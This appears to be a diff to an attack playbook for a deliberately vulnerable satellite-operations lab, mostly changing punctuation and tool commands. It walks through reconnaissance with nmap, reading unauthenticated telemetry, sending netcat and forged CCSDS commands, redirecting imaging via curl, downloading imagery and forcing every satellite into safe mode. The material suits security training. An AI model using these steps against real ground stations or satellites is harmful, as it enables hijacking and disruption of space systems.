@@ -1,4 +1,4 @@
-# Attack Playbook — Operation SUNSTRIKE
+# Attack Playbook - Operation SUNSTRIKE
 
 ## Role
 
@@ -14,7 +14,7 @@ There are no flags. Success means controlling satellites.
 
 **Tools:** nmap, signal_sniffer.py, ground_station_scanner.py
 
-### Step 1.1 — Enumerate the command network
+### Step 1.1 - Enumerate the command network
 
 From inside the Docker environment (or using the MOC as a pivot):
 
@@ -33,19 +33,36 @@ nmap -sT -p 4820 192.168.61.20 192.168.61.21
 
 Expected: both ground stations on port 4820.
 
-### Step 1.2 — Read the MOC telemetry stream without credentials
+### Step 1.2 - Read the MOC telemetry stream without credentials
+
+The WebSocket TLM stream at ws://localhost:8765 accepts anonymous connections (MC-MOC-1).
+Open the dashboard in a browser to watch it live:
 
 ```bash
-python3 lab/tools/signal_sniffer.py --ws ws://localhost:8765
+# Live TLM in the browser, no login needed
+open http://localhost:8080
+```
+
+Or subscribe from the command line with a WebSocket client:
+
+```bash
+# No token required (MC-MOC-1). Install once: npm install -g wscat
+wscat -c ws://localhost:8765
 ```
 
 No password. No token. The stream flows.
-Observe: satellite IDs, lat/lon, battery SOC, mode, and — when downlink is enabled — mission plan data.
+Observe: satellite IDs, lat/lon, battery SOC, mode, and, when downlink is enabled, mission plan data.
 
-### Step 1.3 — Enumerate the ground station
+For wire-level capture of all lab traffic (CCSDS, ground station, MOC), use the sniffer instead:
 
 ```bash
-python3 lab/tools/ground_station_scanner.py --host localhost --port 4820
+sudo python3 lab/tools/signal_sniffer.py --filter all
+```
+
+### Step 1.3 - Enumerate the ground station
+
+```bash
+python3 lab/tools/ground_station_scanner.py --target gs
 ```
 
 Or manually:
@@ -57,7 +74,7 @@ nc localhost 4820
 > LISTCMDS
 ```
 
-Note the banner: `WARNING: MAINTENANCE MODE ACTIVE — authentication is disabled`.
+Note the banner: `WARNING: MAINTENANCE MODE ACTIVE - authentication is disabled`.
 This is MC-GS-3. No password needed.
 
 **Phase 1 complete when:** You have a list of satellite IPs, GS ports, and live TLM data.
@@ -70,7 +87,7 @@ This is MC-GS-3. No password needed.
 
 **Tools:** signal_sniffer.py, telemetry_decoder.py, ccsds_packet_forge.py
 
-### Step 2.1 — Enable downlink to expose mission data
+### Step 2.1 - Enable downlink to expose mission data
 
 From GS-BETA:
 
@@ -102,13 +119,22 @@ Wait one TLM cycle (2-3 seconds). The signal_sniffer output will now include the
 
 This is the classified tasking order for SpaceVE-1A. It was sitting in the unencrypted TLM stream.
 
-### Step 2.2 — Decode raw CCSDS TLM frames
+### Step 2.2 - Decode raw CCSDS TLM frames
+
+Poll the MOC status endpoint (no auth), which lists tracked satellites:
 
 ```bash
-python3 lab/tools/telemetry_decoder.py --host localhost --ws-port 8765
+python3 lab/tools/telemetry_decoder.py --mode status
 ```
 
-Shows the raw CCSDS primary header breakdown, sequence counter, APID, and payload.
+To observe the raw binary CCSDS TM frames on the wire (UDP 5000 satellite to MOC), sniff the
+telemetry bridge with scapy. This is passive, so it does not compete for the port:
+
+```bash
+sudo python3 lab/tools/signal_sniffer.py --filter telemetry
+```
+
+This shows the CCSDS primary header, APID, and frame length for every TLM packet in flight.
 
 **Phase 2 complete when:** You have the mission plan data for all three satellites.
 
@@ -120,7 +146,7 @@ Shows the raw CCSDS primary header breakdown, sequence counter, APID, and payloa
 
 **Tools:** ccsds_packet_forge.py, command_injector.py
 
-### Step 3.1 — Send commands via GS-BETA (no auth)
+### Step 3.1 - Send commands via GS-BETA (no auth)
 
 ```bash
 nc localhost 4820
@@ -131,7 +157,7 @@ nc localhost 4820
 Confirm: in the MOC dashboard (http://localhost:8080), the satellite card updates.
 camera_enabled and downlink_enabled change to true.
 
-### Step 3.2 — Replay attack using raw hex (MC-GS-4, MC-GS-5)
+### Step 3.2 - Replay attack using raw hex (MC-GS-4, MC-GS-5)
 
 Capture a packet from the TLM stream. The CCSDS sequence window is 0x3FFF (full 14-bit range).
 Any captured packet can be replayed.
@@ -143,21 +169,21 @@ nc localhost 4820
 
 This is a raw CCSDS NOP packet. No validation on the GS side.
 
-### Step 3.3 — Direct CCSDS injection (MC-SAT-1)
+### Step 3.3 - Direct CCSDS injection (MC-SAT-1)
 
 Bypass the ground station entirely. Send CCSDS directly to the satellite:
 
 ```bash
-python3 lab/tools/ccsds_packet_forge.py \
-  --sat SpaceVE-1A \
-  --apid 0x200 \
-  --cmd CAMERA_ON \
-  --host 192.168.61.100 \
-  --port 1234 \
-  --send
+python3 lab/tools/ccsds_packet_forge.py send \
+  --cmd camera_on \
+  --ip 192.168.61.100 \
+  --port 1234
 ```
 
 The satellite executes it. No source IP check. This is MC-SAT-1.
+
+Direct UDP reaches the satellite only from inside the spacelab-cmd network. From the host, copy
+the tool into a container on that network first, or use the GS-BETA relay in Step 3.1.
 
 **Phase 3 complete when:** You have sent at least one command that changed satellite state.
 
@@ -169,17 +195,9 @@ The satellite executes it. No source IP check. This is MC-SAT-1.
 
 **Tools:** Browser (Cesium globe), command_injector.py, curl
 
-### Step 4.1 — Redirect via WebSocket (no auth — MC-MOC-5)
+### Step 4.1 - Redirect via the imaging API (no auth, MC-MOC-5)
 
-```bash
-python3 lab/tools/command_injector.py \
-  --redirect \
-  --sat SpaceVE-1A \
-  --lat -33.8688 \
-  --lon 151.2093
-```
-
-Or directly via curl to the HTTP endpoint:
+The redirect endpoint takes no authentication. Post the new coordinates directly:
 
 ```bash
 curl -s -X POST http://localhost:8080/api/imagery/redirect \
@@ -190,7 +208,7 @@ curl -s -X POST http://localhost:8080/api/imagery/redirect \
 No authentication. No authorization check. The satellite's imaging target moves to Sydney.
 The footprint circle on the Cesium globe jumps to the new coordinates.
 
-### Step 4.2 — Capture Earth imagery from the redirected target
+### Step 4.2 - Capture Earth imagery from the redirected target
 
 ```bash
 curl -s -X POST http://localhost:8080/api/imagery/capture \
@@ -229,7 +247,7 @@ curl -o exfil_sydney.png http://localhost:8080/imagery/IMG_20260926_123456_LAT-3
 
 **Tools:** GS-BETA console, ccsds_packet_forge.py
 
-### Step 5.1 — SAFING_MODE all three satellites
+### Step 5.1 - SAFING_MODE all three satellites
 
 ```bash
 nc localhost 4820
@@ -241,7 +259,7 @@ nc localhost 4820
 Each satellite's mode changes to SAFE. The MOC dashboard shows all three in red.
 OrsuSpace's Earth observation mission is now suspended.
 
-### Step 5.2 — Confirm impact
+### Step 5.2 - Confirm impact
 
 In the MOC dashboard, observe:
 - All satellite cards show mode: SAFE
